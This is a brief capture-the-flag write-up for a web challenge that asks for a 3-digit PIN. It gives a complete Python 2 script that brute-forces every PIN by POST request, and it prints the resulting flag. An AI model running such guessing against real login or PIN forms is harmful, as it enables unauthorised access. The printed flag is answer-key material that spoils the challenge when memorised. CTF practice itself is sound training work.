# CTF Writeup
The challenge will be available on `http://challenges.at10a.net:8080/web09/`

# Requirement from challenge
This challenge require you to enter 3-digits pin, if correct then flag will be showed.

# Solving
I wrote a script to bruteforce this pin, using `urllib`, `urllib2`, `string`, `itertools`, `sys`, `bs4` library.

# Script
```python
import urllib, urllib2
import string
import itertools, sys
from bs4 import BeautifulSoup
url = "http://challenges.at10a.net:8080/web09/"
for i in itertools.product('0123456789',repeat=3):
    value = {'num':  str(''.join(i))}
    data = urllib.urlencode(value)
    req = urllib2.Request(url,data)
    res = BeautifulSoup(urllib2.urlopen(req), 'html.parser').get_text()
    if 'Wrong pin!' not in res:
        print ''.join(i)
        sys.exit(0)
```
Run it with python

# The flag is : BMC{why_c0uld_7h3_fb1_n07_bru73f0rc3_7h3_1ph0n3?}